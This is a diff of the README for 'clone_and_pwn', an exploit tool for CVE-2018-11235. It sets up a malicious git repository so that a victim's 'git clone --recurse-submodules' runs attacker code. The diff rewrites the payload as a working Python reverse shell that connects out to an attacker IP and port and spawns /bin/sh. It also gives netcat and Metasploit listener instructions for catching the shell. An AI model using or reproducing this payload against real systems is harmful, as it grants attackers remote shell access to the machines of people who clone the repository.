@@ -9,22 +9,29 @@ To use this module simply put it on a server with direct internet access (e.g. A
 something like the following:
 
 ```
-#!/bin/sh
+#!/usr/bin/python
 
-$EXTERN_IP=127.0.0.1
-$EXTERN_PORT=8080
+EXTERN_IP="127.0.0.1"
+EXTERN_PORT=8080
 
-#reverse shell to IP EXTERN_IP
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$EXTERN_IP",$EXTERN_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+#reverse shell to IP EXTERN_IP and port EXTERN_PORT
+import socket, subprocess, os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((EXTERN_IP, EXTERN_PORT))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
 ```
 
 Set EXTERN_IP and EXTERN_PORT to the IP (external) and port you'd like to receive your reverse shell on. A reverse shell can be received with something like:
 
 `nc -l <EXTERN_IP> EXTERN_PORT` e.g. `nc -l 193.23.23.32 8080`
 
-Once the user has run the command `git clone --recurse-submodules git://<your ip>/repo dest_dir` you will receive a reverse shell.
+Or with Metasploit's generic shell module. Once the user has run the command `git clone --recurse-submodules git://<your ip>/repo dest_dir` you will receive a reverse shell.
 
-If you're having trouble running multiple times check the following:
+If you're having trouble running multiple times (or after a failed attempt) check the following:
 
 - Run ./clean.sh, note this will delete all data in /tmp
 - check the processes with `ps aux | grep git` to ensure you aren't already running gitdaemon. Kill any gitdaemon processes.
@@ -49,3 +56,5 @@ This script adapted from https://github.com/Rogdham/CVE-2018-11235, much love an
 =======
 # clone_and_pwn
 Exploits CVE-2018-11235
+
+By @_hyp3ri0n and @mehaase
